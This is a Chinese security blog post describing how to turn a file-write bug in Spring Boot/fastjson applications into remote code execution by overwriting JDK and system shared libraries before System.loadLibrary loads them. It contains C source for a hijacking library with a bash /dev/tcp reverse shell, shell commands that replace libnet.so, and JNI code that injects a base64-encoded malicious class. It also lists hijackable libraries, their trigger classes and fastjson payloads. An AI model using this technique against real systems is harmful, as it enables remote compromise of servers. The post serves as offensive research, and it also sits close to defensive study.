#  springboot环境下的写文件RCE——so劫持篇  
原创 珂字辈
                        珂字辈  珂技知识分享   2026-03-02 03:32  
  
0，前言  
  
可以先看传统写文件RCE  
  
[springboot环境下的写文件RCE](https://mp.weixin.qq.com/s?__biz=MzUzNDMyNjI3Mg==&mid=2247487184&idx=1&sn=834e20b19fcffcda9a3357c7621d7bcc&scene=21#wechat_redirect)  
  
  
在写这篇文章的时候其实就已经发现jdk的so劫持手法了，所以  
fastjson写文件挑战2也是为了这顿醋包的饺子。  
  
fastjson写文件挑战2已经完成，jcw/77/su18都给出了相当漂亮的解题方案，虽然预期解还是没出，但也大差不差了。  
  
现在对  
fastjson写文件挑战2环境  
进行了加固，去掉了回显不让读jdk路径，大部分so都只读无法劫持，还设置了不出网以增加难度。有兴趣的可以继续做。  
  
  
https://github.com/kezibei/fastjson_payload/tree/main/docker2  
  
  
http://104.160.44.44:8078/json  
  
  
1，  
System.loadLibrary  
  
  
https://i.blackhat.com/USA21/Wednesday-Handouts/US-21-Xing-How-I-Used-a-JSON.pdf  
  
这篇文章描述了如何劫持/tmp目录下的so文件，但并不通用。  
  
研究过程中我发现了更加暴力的劫持java库文件的写文件RCE，也就是System.loadLibrary()，跟进到代码来看，会优先从sys_paths加载so，然后尝试usr_paths。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Be2IPichjh3NqJkBKGXicJxYLUAq2fTqmypAibFmN6t7Xas2AZViaMZvbOVicK9qLqULOXGhw3zcuyOI4SW18ZXg7oNs31LR6RJhp9GyzdkSxaNI/640?wx_fmt=png&from=appmsg "")  
  
  
sys_paths一般只有一个，也就是jdk自己的库文件目录。  
  
在windows中，java net库文件在如下路径  
  
C:\Program Files\Java\jdk-11.0.11\bin\net.dll  
  
在linux中，路径  
如下  
  
/usr/lib/jvm/java-11-openjdk-amd64/lib/libnet.so  
  
在docker中，路径如下  
  
/usr/local/openjdk-11/lib/  
libnet.so  
  
如果使用arm64架构，路径如下。  
  
/usr/local/jdk8u281/jre/lib/aarch64/libnet.so  
  
如果sys_paths中找不到，还有usr_paths，windows中usr_paths是%PATH%，linux中则是如下目录。  
  
/usr/java/packages/lib  
  
/usr/lib/x86_64-linux-gnu/jni  
  
/lib/x86_64-linux-gnu  
  
/usr/lib/x86_64-linux-gnu  
  
/usr/lib/jni  
  
/lib  
  
/usr/lib  
  
劫持charsets.jar时我们知道如果charsets.jar已经被加载过，改动它再进行加载会导致进程崩溃。loadLibrary也是一样的，比如springboot启动时会加载net，启动之后将libnet.so改成弹shell的so。  
```
#include <unistd.h>

void payload(void){
    system("bash -i >& /dev/tcp/192.168.229.131/5667 0>&1 ");
}

__attribute__ ((__constructor__)) void exec(void){
    payload();
    return;
}
```  
  
```
gcc -shared -fPIC net.c -o net.so
cp /usr/lib/jvm/java-11-openjdk-amd64/lib/libnet.so libnet.so.bak
cp net.so /usr/lib/jvm/java-11-openjdk-amd64/lib/libnet.so
```  
  
  
然后实例化sun.net.PortConfig触发它，就会导致崩溃。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Be2IPichjh3NOVt2VZUVXwrgB1mtFiaNBz0xnDlj9rx0Jg2UrgvgCGD5TmFe8n66juY1SKZA9NStHAic6Ucv3jRPMazKtXgdlyRCG5zoKbuJ38/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Be2IPichjh3P7oOwqHy7Mwwia5Ph7lD3icXSRx7rYe0052DhNBODiaxibaval1BnebXwtZ8MkZKLSsU2sA2w0oSWKlu4KnGcmtWwkgjOBlbHNKW8/640?wx_fmt=png&from=appmsg "")  
  
  
因此，必须劫持那些初始没有被springboot加载过的库文件，断点System.loadLibrary(String)，看看springboot启动时会大致会加载什么。  
  
  
windows jdk8  
  
instrument/management/net/nio/tcnative-1  
  
windows   
jdk11  
  
instrument/net/nio/zip/jimage/sunmscapi/sunec/management/management_ext/tcnative-1/extnet  
  
  
linux可以直接看/proc/self/maps  
```
cat /proc/6/maps | grep "/usr/local" | grep ".so" | awk '{print $NF}' | sort | uniq
```  
  
jdk8  
  
/usr/local/openjdk-8/jre/lib/amd64/libjava.so  
  
/usr/local/openjdk-8/jre/lib/amd64/libmanagement.so  
  
/usr/local/openjdk-8/jre/lib/amd64/libnet.so  
  
/usr/local/openjdk-8/jre/lib/amd64/libnio.so  
  
/usr/local/openjdk-8/jre/lib/amd64/libsunec.so  
  
/usr/local/openjdk-8/jre/lib/amd64/libverify.so  
  
/usr/local/openjdk-8/jre/lib/amd64/libzip.so  
  
/usr/local/openjdk-8/jre/lib/amd64/server/libjvm.so  
  
/usr/local/openjdk-8/jre/lib/resources.jar  
  
/usr/local/openjdk-8/lib/amd64/jli/libjli.so  
  
jdk11  
  
/usr/local/openjdk-11/lib/jli/libjli.so  
  
/usr/local/openjdk-11/lib/libextnet.so  
  
/usr/local/openjdk-11/lib/libjava.so  
  
/usr/local/openjdk-11/lib/libjimage.so  
  
/usr/local/openjdk-11/lib/libmanagement.so  
  
/usr/local/openjdk-11/lib/libmanagement_ext.so  
  
/usr/local/openjdk-11/lib/libnet.so  
  
/usr/local/openjdk-11/lib/libnio.so  
  
/usr/local/openjdk-11/lib/libsunec.so  
  
/usr/local/openjdk-11/lib/libverify.so  
  
/usr/local/openjdk-11/lib/libzip.so  
  
/usr/local/openjdk-11/lib/server/libjvm.so  
  
  
那么哪些库文件不在这些列表中且比较容易触发呢？awt就是一个非常容易触发的so，大部分跟图形化有关的类，比如  
java.awt和  
javax.swing都能触发它。而正常的springboot是不用这些类的。  
  
这里用的是JMenuItem，在Toolkit初始化时触发。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Be2IPichjh3OICLicNicYkib2KVicHOxoCXAW6HnS34ibYyHotoIEUYtd4AeE6PUibiaAguEcsCT2wa5pclqj57YIFNUIwmibFt18Y4Vyicj9L0fXbJNo/640?wx_fmt=png&from=appmsg "")  
  
  
成功弹回shell，但会阻塞web。断开shell后web才能正常使用。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Be2IPichjh3P79LQvSiaiasht8WCP3YJOcBJeAia6MXCB1yiajVHZ4DazjaxKEPqQKzHcpGxEcJeLJ1J8IC6AdmLONQWTNeyIHFibialhUdjcHu8H8/640?wx_fmt=png&from=appmsg "")  
  
  
在jdk源码中搜索【System.loadLibrary("】，大部分都在静态代码块，因此loadLibrary都可以靠Class.forName(true)触发且分别只有一次机会。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Be2IPichjh3N3WLMjMZXNQoic0KmF6vNKrGj1lmDeeWI2uSp4szFHYr1Ve4hkNsicjdA7Ed2HB1DDs8jVRHPaxJoBqibSYox6Obu8cwjjhKv8Sk/640?wx_fmt=png&from=appmsg "")  
  
  
但也有实例化时触发  
loadLibrary的，它们能否反复触发呢？  
  
com.sun.security.auth.module.NTSystem  
  
com.sun.security.auth.module.UnixSystem  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Be2IPichjh3PJY3zrtVpEezTLN6zS7qfcJBxxVao6nX15nSLpdxX5kvXSM9ibT1tcpIhuoaglqTDKmogJiaqXkKase80sdLXdfl17vloAZJkmE/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Be2IPichjh3MyWcVHrVverlE9DPKTQq2QjI7C3ftN8yibiaxIe2mquM4mzS8XQhkTmzsl8GHsL0oXjaYmFX7mTlIO4Gtl3lLicdCogs3sq8w5Nk/640?wx_fmt=png&from=appmsg "")  
  
  
看起来可以反复触发loadLibrary。但是一旦触发一次，库文件就会加入jdk.internal.loader.ClassLoaders$AppClassLoader的nativeLibraries中，第二次就不再尝试载入该文件，因此java库劫持均每个库只有一次机会。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Be2IPichjh3NNlFDTxSFJygvdkbUjdHicL7DOXbvMQ8DXr6HsEOYk3wicrkZibPInUyXTaj9ssTFN0Tmhoia6DWZiahPRqZpURBk1IiaHaVEIez1ibE/640?wx_fmt=png&from=appmsg "")  
  
  
  
总结linux-openjdk11如下  
  
(linux/windows，jdk8/jdk11，oraclejdk/openjdk都有一些区别)  
  
  
libawt.so  
  
java.awt  
  
javax.swing  
  
libjaas.so  
  
com.sun.security.auth.module.NTSystem  
  
com.sun.security.auth.module.UnixSystem  
  
libcsaproc.so  
  
sun.jvm.hotspot.debugger.bsd.BsdDebuggerLocal  
  
sun.jvm.hotspot.debugger.linux.LinuxDebuggerLocal  
  
sun.jvm.hotspot.debugger.proc.ProcDebuggerLocal  
  
libfontmanager.so  
  
sun.font.FontManagerNativeLibrary  
  
libmanagement_agent.so  
  
jdk.internal.agent.FileSystemImpl  
  
libprefs.so  
  
java.util.prefs.FileSystemPreferences  
  
libjavajpeg.so  
  
sun.awt.image.JPEGImageDecoder  
  
com.sun.imageio.plugins.jpeg.JPEGImageReader  
  
com.sun.imageio.plugins.jpeg.JPEGImageWriter  
  
librmi.so  
  
sun.rmi.transport.GC  
  
libunpack.so  
  
com.sun.java.util.jar.pack.NativeUnpack  
  
libj2pkcs11.so  
  
sun.security.pkcs11.wrapper.PKCS11  
  
libjsound.so  
  
com.sun.media.sound.Platform  
  
libj2pcsc.so  
  
sun.security.smartcardio.PlatformPCSC  
  
libsctp.so  
  
sun.nio.ch.sctp.SctpChannelImpl  
  
sun.nio.ch.sctp.SctpMultiChannelImpl  
  
sun.nio.ch.sctp.SctpServerChannelImpl  
  
libattach.so  
  
sun.tools.attach.VirtualMachineImpl  
  
  
  
  
优点如下  
  
1，jdk8-11适用  
  
2，有多次机会，awt写坏了可以写jaas等等  
  
缺点如下  
  
1，需root权限  
  
2，如果so已经被加载，改写文件并再次加载可能会导致进程崩溃  
  
  
  
2，  
JNI  
  
  
System.loadLibrary加载so的目的就是在调类的native方法时，调so中的C语言代码。因此我们可以写个正规so出来劫持native方法。  
  
JPEGImageDecoder的initIDs方法就很合适。  
![](https://mmbiz.qpic.cn/mmbiz_png/Be2IPichjh3Oo5b0eSb1eoj1MUga1KRKAvTu0AzicSzxqFDuMEm8bgORjV7XWNicxVpHYL5XTemGcdDtOV22LmIWuR8mSFh5Z9rGRV8TI8abxk/640?wx_fmt=png&from=appmsg "")  
  
新建类JPEGImageDecoder.java  
```
package sun.awt.image;

public class JPEGImageDecoder {

   public JPEGImageDecoder() throws Exception {
   }

   private static native void initIDs(Class<?> clazz);

   static {
      System.loadLibrary("javajpeg");
      initIDs(null);
   }
}
```  
  
在linux下编译并转成成.h文件  
  
javac -h . JPEGImageDecoder.java  
  
内容大致如下。  
```
/* DO NOT EDIT THIS FILE - it is machine generated */
#include <jni.h>
/* Header for class sun_awt_image_JPEGImageDecoder */
#ifndef _Included_sun_awt_image_JPEGImageDecoder
#define _Included_sun_awt_image_JPEGImageDecoder
#ifdef __cplusplus
extern "C" {
#endif
/*
 * Class:     sun_awt_image_JPEGImageDecoder
 * Method:    initIDs
 * Signature: (Ljava/lang/Class;)V
 */
JNIEXPORT void JNICALL Java_sun_awt_image_JPEGImageDecoder_initIDs
  (JNIEnv *, jclass, jclass);
#ifdef __cplusplus
}
#endif
#endif
```  
  
  
写JPEGImageDecoder.c，重构initIDs，chatGPT完成。  
```
#include "sun_awt_image_JPEGImageDecoder.h"
#include <jni.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

JNIEXPORT void JNICALL Java_sun_awt_image_JPEGImageDecoder_initIDs
  (JNIEnv *env, jclass clazz, jclass clazz2) {
    // Base64 解码的字节码
    const char* base64Code = "yv66xxxx";
    // 获取 Base64 解码器的类和 decode 方法
    jclass base64Class = (*env)->FindClass(env, "java/util/Base64");
    jmethodID getDecoderMethod = (*env)->GetStaticMethodID(env, base64Class, "getDecoder", "()Ljava/util/Base64$Decoder;");
    jobject decoder = (*env)->CallStaticObjectMethod(env, base64Class, getDecoderMethod);
    jclass decoderClass = (*env)->FindClass(env, "java/util/Base64$Decoder");
    jmethodID decodeMethod = (*env)->GetMethodID(env, decoderClass, "decode", "(Ljava/lang/String;)[B");
    // 将 Base64 字符串转换为 Java 字符串
    jstring base64String = (*env)->NewStringUTF(env, base64Code);
    // 调用 decode 方法进行解码
    jbyteArray bytecode = (jbyteArray)(*env)->CallObjectMethod(env, decoder, decodeMethod, base64String);
    // 获取 ClassLoader 并找到 defineClass 方法
    jclass classLoaderClass = (*env)->FindClass(env, "java/lang/ClassLoader");
    jmethodID getSystemClassLoaderMethod = (*env)->GetStaticMethodID(env, classLoaderClass, "getSystemClassLoader", "()Ljava/lang/ClassLoader;");
    jobject systemClassLoader = (*env)->CallStaticObjectMethod(env, classLoaderClass, getSystemClassLoaderMethod);
    // 获取 defineClass 方法
    jmethodID defineClassMethod = (*env)->GetMethodID(env, classLoaderClass, "defineClass", "(Ljava/lang/String;[BII)Ljava/lang/Class;");
    // 定义类名
    jstring className = (*env)->NewStringUTF(env, "Tomcat678910cmdechoException");
    // 获取字节码的长度
    jint bytecodeLength = (*env)->GetArrayLength(env, bytecode);
    // 调用 defineClass 方法定义类
    jobject definedClass = (*env)->CallObjectMethod(env, systemClassLoader, defineClassMethod, className, bytecode, 0, bytecodeLength);
    // 调用 newInstance 来创建类实例
    jclass definedClassRef = (*env)->GetObjectClass(env, definedClass);
    jmethodID newInstanceMethod = (*env)->GetMethodID(env, definedClassRef, "newInstance", "()Ljava/lang/Object;");
    (*env)->CallObjectMethod(env, definedClass, newInstanceMethod);
}
```  
  
  
将jni.h和jni_md.h依赖拖到一起，gcc编译。  
  
gcc -shared -fpic -I./ -o libjavajpeg.so JPEGImageDecoder.c  
  
  
实际利用效果如下。  
  
第一步，用反序列化链写入/usr/local/openjdk-11/lib/libjavajpeg.so  
  
第二步，Class.ForName(JPEGImageDecoder)  
```
JPEGImageDecoder#static{}->
System.loadLibrary()->
JPEGImageDecoder#initIDs()->
libjavajpeg.so#Java_sun_awt_image_JPEGImageDecoder_initIDs->
Tomcat678910cmdechoException#static{}->触发一次命令执行->
Tomcat678910cmdechoException.class.newInstance()->触发第二次命令执行
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Be2IPichjh3OJzfgH3trgv8jRVEdkoysfNt3Yjj8InhJay3ZGHibmlMj81zeyYCNCglXxsz5q0DTXiajOCdhTgkoT5ibxuI3MLf8FE6gLu7MmWU/640?wx_fmt=png&from=appmsg "")  
  
  
这样就能在全程不影响springboot的情况下完成恶意类加载。  
  
更加通用的办法是用  
__attribute__((constructor))，这样就无所谓  
initIDs了。但这样没有jvm对象无法加载恶意类，su18在自己的星球中给出了一个获取jvm对象的办法。  
  
  
  
3，第三方JNI  
  
  
Oracle  
  
第三方也有可能触发System.loadLibrary()，在ojdbc中存在oracle.jdbc.xa.client.OracleXADataSource[#getXAConnection]()  
()，可以触发两种loadLibrary。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Be2IPichjh3P6eDFD8fPrrM4cwbPJ2dkepn8L9QbcdQWUzbMv0LYG3oxibGhr5ibMK06SXe6oGgbwRRf9GPIFuzHoMgmibUSqsuBF3aEZgryibibM/640?wx_fmt=png&from=appmsg "")  
```
     OracleXADataSource ds = new OracleXADataSource();
     ds.setURL("jdbc:oracle:oci:@//127.0.0.1:1521/orcl");
     ds.setNativeXA(true);
     ds.getXAConnection();
```  
  
会触发heteroxa21，21为ojdbc的大版本号，比如我这里用的是ojdbc8-21.4.0.0.1.jar，就会loadLibrary("heteroxa21")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Be2IPichjh3PNYnRAmB3ibeKKfD6JzJ2wqtAlFFpPB5Y4B3SFHRuABw1yEiaJqrNqtWF2xdGrSr80MPXkyM56BUrL6Vd5Ojvnn89N4WDKBWMto/640?wx_fmt=png&from=appmsg "")  
  
另外一种是ocijdbc21  
```
     OracleXADataSource ds = new OracleXADataSource();
     ds.setURL("jdbc:oracle:oci:@//127.0.0.1:1521/orcl");
     //ds.setNativeXA(true);
     ds.getXAConnection();
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Be2IPichjh3MGXhHESVHGnppbQmTtknlrzaJPBarNic5fxeqoax2elV9IY4T9njmFvyQTevrhd39mCDLD0cffIdwicQBiaTcBV8IJ44e1p5ibsjA/640?wx_fmt=png&from=appmsg "")  
  
  
  
4，linux so  
  
  
在fastjson写文件挑战2中，我将jdk的路径随机化了且去掉了io，本意是想增加题目难度，不让挑战者利用  
System.loadLibrary劫持jdk so。但jcw使用了一个非常漂亮的jdk11_read链读到了jdk路径，突破了这层防御。  
  
如果真的未知  
jdk路径，还能劫持哪些so呢？  
  
  
77给出了一个答案，我们最常用的fastjson dns链。  
```
{"@type": "java.net.Inet4Address", "val": "x.com"}
```  
  
会加载  
  
/lib/x86_64-linux-gnu/libnss_dns.so.2  
  
/lib/x86_64-linux-gnu/libresolv.so.2  
  
当然，dns实战中很有可能已经被提前触发。  
  
  
su18也给出了一个答案，fastjson内置几个awt白名单  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Be2IPichjh3MpicgqEah3eS9X7kBib1q7e0xUicbkhrUXu3UxNCJ6qwZOXkUNXt85pDtlFehN6YCS95QJGG9zKRiab6kk38TfLEeekNXJkLazGP4/640?wx_fmt=png&from=appmsg "")  
  
  
其中  
java.awt.Font可以触发以下so加载。  
```
{"@type": "java.awt.Font","name": "Serif","style": 1,"size": 24}
```  
  
/usr/lib/x86_64-linux-gnu/libpng16.so.16  
  
/usr/lib/x86_64-linux-gnu/libfreetype.so.6  
  
/usr/local/openjdk-11/lib/libawt.so  
  
/usr/local/openjdk-11/lib/libawt_headless.so  
  
/usr/local/openjdk-11/lib/libfontmanager.so  
  
```
{"@type":"java.awt.Rectangle"}
```  
  
/usr/local/openjdk-11/lib/libawt.so  
  
/usr/local/openjdk-11/lib/libawt_headless.so  
  
```
{"@type":"java.awt.Color"}
```  
  
/usr/local/openjdk-11/lib/libawt.so  
  
/usr/local/openjdk-11/lib/libawt_headless.so  
  
/usr/local/openjdk-11/lib/liblcms.so  
  
  
发挥你的想象力，还有可能存在很多jdk/linux的so以供劫持。  
  
对应的，还有触发加载so的方法，这些方法具体有哪些呢？  
请期待so加载篇。  
  
  
